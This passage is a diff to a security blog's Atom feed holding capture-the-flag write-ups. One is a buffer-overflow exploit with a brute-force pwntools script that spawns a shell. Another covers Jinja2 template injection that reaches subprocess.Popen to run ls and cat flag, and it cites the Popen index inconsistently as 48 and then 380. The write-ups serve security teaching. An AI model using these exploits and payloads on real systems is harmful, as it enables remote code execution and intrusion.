+r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, p32(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;;&#x2F;bin&#x2F;sh;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+r.interactive()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>GCI - Fedora Project - Exploiting a Buffer Overflow Vulnerability</title>
+		<published>2019-12-15T00:00:00+00:00</published>
+		<updated>2019-12-15T00:00:00+00:00</updated>
+		<link href="/posts/gci-exploiting-a-buffer-overflow-vulnerability/" type="text/html"/>
+		<id>/posts/gci-exploiting-a-buffer-overflow-vulnerability/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;p&gt;We are given a binary to exploit. By running &lt;code&gt;checksec&lt;&#x2F;code&gt; on it, we see that the binary has the following protections:
+[show-line-numbers]: false&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;Canary                        : No
+NX                            : Yes
+PIE                           : Yes
+Fortify                       : No
+RelRO                         : Partial
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Because the binary has NX, we cannot place executable shell code in a buffer and then jump to it. PIE allows the code 
+section of the binary to be located anywhere in memory. This means that we don&#x27;t know the address of functions within 
+the binary; however, we still know relative offsets.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reverse-engineering&quot;&gt;Reverse Engineering&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;Dump of assembler code for function main:
+   0x0000000000001145 &amp;lt;+0&amp;gt;:     push   rbp                                  # Setup Stack
+   0x0000000000001146 &amp;lt;+1&amp;gt;:     mov    rbp,rsp                              
+   0x0000000000001149 &amp;lt;+4&amp;gt;:     sub    rsp,0x110                            # Allocate 0x110 bytes on stack
+   0x0000000000001150 &amp;lt;+11&amp;gt;:    mov    DWORD PTR [rbp-0x104],edi            # Copies edi into stack offset 0x104
+   0x0000000000001156 &amp;lt;+17&amp;gt;:    mov    QWORD PTR [rbp-0x110],rsi            # Copies rsi into stack offset 0x110
+   0x000000000000115d &amp;lt;+24&amp;gt;:    mov    rax,QWORD PTR [rbp-0x110]            # Copies value of pointer into rax
+   0x0000000000001164 &amp;lt;+31&amp;gt;:    add    rax,0x8                              # Adds size_t
+   0x0000000000001168 &amp;lt;+35&amp;gt;:    mov    rdx,QWORD PTR [rax]                  # Copies the value of the pointer [rax + 8] into rdx
+   0x000000000000116b &amp;lt;+38&amp;gt;:    lea    rax,[rbp-0x100]                      # Loads the address of [rbp - 0x100] into rax
+   0x0000000000001172 &amp;lt;+45&amp;gt;:    mov    rsi,rdx                              # rsi = rdx
+   0x0000000000001175 &amp;lt;+48&amp;gt;:    mov    rdi,rax                              # rdi = rax
+   0x0000000000001178 &amp;lt;+51&amp;gt;:    call   0x1030 &amp;lt;strcpy@plt&amp;gt;                  # Calls strcpy(rsi, rdi) ; strcpy ([rbp - 0x100], argv[1])
+   0x000000000000117d &amp;lt;+56&amp;gt;:    lea    rax,[rbp-0x100]                      # Loads address of [rbp-0x100] into rax
+   0x0000000000001184 &amp;lt;+63&amp;gt;:    mov    rdi,rax                              # rdi = rax
+   0x0000000000001187 &amp;lt;+66&amp;gt;:    call   0x1040 &amp;lt;puts@plt&amp;gt;                    # puts(rdi)
+   0x000000000000118c &amp;lt;+71&amp;gt;:    mov    eax,0x0                              # return 0
+   0x0000000000001191 &amp;lt;+76&amp;gt;:    leave                                       
+   0x0000000000001192 &amp;lt;+77&amp;gt;:    ret                                         
+End of assembler dump.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;We can see that &lt;code&gt;argv[1]&lt;&#x2F;code&gt; is copied into a 0x100 byte buffer on the stack. However, there are no checks on the size of &lt;code&gt;argv[1]&lt;&#x2F;code&gt;. This is plainly a stack overflow vulnerability. &lt;&#x2F;p&gt;
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;&#x2F;h2&gt;
+&lt;p&gt;Now that we have an understanding of what the binary does, we can construct a payload to get code execution. Since the canary is not enabled, we can overwrite the return address. However, because of PIE and ASLR, we don&#x27;t have any clear targets to jump to.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;where-do-we-jump&quot;&gt;Where do we jump?&lt;&#x2F;h3&gt;
+&lt;p&gt;The binary is dynamically linked and uses the system libc. We can find targets within the binary, when jumped to, result in a call to &lt;code&gt;execve(&amp;quot;&#x2F;bin&#x2F;sh&amp;quot;, NULL, NULL)&lt;&#x2F;code&gt; and lead to &amp;quot;a shell&amp;quot;.  The tool &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;david942j&#x2F;one_gadget&quot;&gt;one_gadget&lt;&#x2F;a&gt; finds offsets to these one gadgets within a given libc binary. Running &lt;code&gt;one_gadget libc.so.6&lt;&#x2F;code&gt; gives the following output:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;gci-exploiting-a-buffer-overflow-vulnerability&#x2F;5df7042c0898260951d4389c.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;However, we don&#x27;t know the base address that libc is loaded at.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;how&quot;&gt;How?&lt;&#x2F;h3&gt;
+&lt;p&gt;Generally, the libc runtime handles initializes itself before calling &lt;code&gt;main&lt;&#x2F;code&gt;. This means that when &lt;code&gt;main&lt;&#x2F;code&gt; returns, we end up within libc. In fact, in this &lt;a href=&quot;https:&#x2F;&#x2F;asciinema.org&#x2F;a&#x2F;JRs1KT1HQCoDUSDAmW1r6CCcC&quot;&gt;asciinema&lt;&#x2F;a&gt;, we see that &lt;code&gt;main&lt;&#x2F;code&gt; returns to &lt;code&gt;__libc_start_main&lt;&#x2F;code&gt; within libc. &lt;&#x2F;p&gt;
+&lt;p&gt;If we overflow the buffer, we can overwrite this address. We could overwrite the entire return pointer, but what if we only overwrote it partially? This is known as a partial overwrite. Since all functions within libc have the same base address, we can overwrite the lower bytes of the return pointer to jump to any known offset within libc.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;one-small-problem&quot;&gt;One small problem&lt;&#x2F;h3&gt;
+&lt;p&gt;When &lt;code&gt;strcpy&lt;&#x2F;code&gt; is called, it adds a null byte to the end of the destination buffer. If we attempt a partial overwrite, this will result &lt;code&gt;0x00&lt;&#x2F;code&gt; being placed within the return pointer.&lt;&#x2F;p&gt;
+&lt;p&gt;To overcome this, we can bruteforce ASLR by repeatedly running the program until libc is loaded in a position that matches the overwritten return pointer. We need to bruteforce 1.5 bytes (because the one_gadget is &lt;code&gt;4f2c5&lt;&#x2F;code&gt;, we only need to bruteforce the upper half of &lt;code&gt;0x?4&lt;&#x2F;code&gt; and the null byte before it). This means that, on average, we will need to execute the program &lt;code&gt;4096&lt;&#x2F;code&gt; times before successfully reaching a shell.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;full-script&quot;&gt;Full Script&lt;&#x2F;h2&gt;
+&lt;script async id=&quot;asciicast-vaUS0kLREa4r92cFJuaipXW5u&quot; src=&quot;https:&#x2F;&#x2F;asciinema.org&#x2F;a&#x2F;vaUS0kLREa4r92cFJuaipXW5u.js&quot;&gt;&lt;&#x2F;script&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+                r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;process([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;exploitme&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;264 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\xc5\xf2\x04&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])
+                r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;ls&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(r.can_recv())
+                r.interactive()
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;EOFError&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+                &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;pass
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This is a writeup for this &lt;a href=&quot;https:&#x2F;&#x2F;codein.withgoogle.com&#x2F;dashboard&#x2F;task-instances&#x2F;5481487256780800&#x2F;&quot;&gt;Google Code-In task&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>picoCTF 2018 - Flaskcards and Freedom</title>
+		<published>2018-10-12T21:02:44.420+00:00</published>
+		<updated>2018-10-12T22:55:27.216+00:00</updated>
+		<link href="/posts/picoctf-2018-flaskcards-and-freedom/" type="text/html"/>
+		<id>/posts/picoctf-2018-flaskcards-and-freedom/</id>
+		<content type="html">&lt;h1 id=&quot;problem&quot;&gt;Problem&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;quot;There seem to be a few more files stored on the flash card server but we can&#x27;t login. Can you?&amp;quot;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h1&gt;
+&lt;p&gt;The site appears to be the same as the previous flaskcard challenges &lt;code&gt;Flaskcards Skeleton Key&lt;&#x2F;code&gt; and  &lt;code&gt;Flaskcards.&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;When we create an account, we are presented with the following screen:
+&lt;img src=&quot;&#x2F;posts&#x2F;picoctf-2018-flaskcards-and-freedom&#x2F;5bc10c83f1882e545d7f430a.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can try server side injection. If we type in &lt;code&gt;{{1+1}}&lt;&#x2F;code&gt;, the webpage displays &lt;code&gt;2&lt;&#x2F;code&gt;.  Any values in double brackets is being executed on the server. After trying to find hidden variables, such as &lt;code&gt;config&lt;&#x2F;code&gt;, &lt;code&gt;flag&lt;&#x2F;code&gt;, etc; I decided to look for a remote code execution vulnerability. &lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;picoctf-2018-flaskcards-and-freedom&#x2F;5bc114c3b7c5001b74f57e35.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can list all of the loaded classes by calling &lt;code&gt;__subclasses__&lt;&#x2F;code&gt; on the base object class. To do this, I used the &lt;code&gt;mro&lt;&#x2F;code&gt; method, which lists all of the superclasses, including &lt;code&gt;object&lt;&#x2F;code&gt;. Calling this on a string gives easy access to the base object class.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;picoctf-2018-flaskcards-and-freedom&#x2F;5bc114f6b7c5001b74f57e37.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The object class is index &lt;code&gt;1&lt;&#x2F;code&gt; when calling &lt;code&gt;&#x27;&#x27;.__class__.mro()&lt;&#x2F;code&gt;. So we can access the subclasses of object by injecting &lt;code&gt;&#x27;&#x27;.__class__.mro()[1].__subclasses__()&lt;&#x2F;code&gt;. This results in a lot of output.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;picoctf-2018-flaskcards-and-freedom&#x2F;5bc11620b7c5001b74f57e39.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;After cleaning up the output, I found that &lt;code&gt;&amp;lt;class &#x27;subprocess.Popen&#x27;&amp;gt;&lt;&#x2F;code&gt; was index 48.&lt;&#x2F;p&gt;
+&lt;p&gt;From there it is possible to run &lt;code&gt;ls&lt;&#x2F;code&gt; with &lt;code&gt;{{&#x27;&#x27;.__class__.mro()[1].__subclasses__()[48]([&#x27;ls&#x27;], stdout=-1).communicate()}}&lt;&#x2F;code&gt;. Running with &lt;code&gt;-1&lt;&#x2F;code&gt; results in the output being returned as a tuple:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;picoctf-2018-flaskcards-and-freedom&#x2F;5bc11752b7c5001b74f57e3c.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Calling &lt;code&gt;ls&lt;&#x2F;code&gt; lists the files in the directory. All that&#x27;s left is to call &lt;code&gt;cat flag&lt;&#x2F;code&gt; with &lt;code&gt;{{&#x27;&#x27;.__class__.mro()[1].__subclasses__()[380]([&#x27;cat&#x27;, &#x27;flag&#x27;], stdout=-1).communicate()}}&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;picoctf-2018-flaskcards-and-freedom&#x2F;5bc117aab7c5001b74f57e3e.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
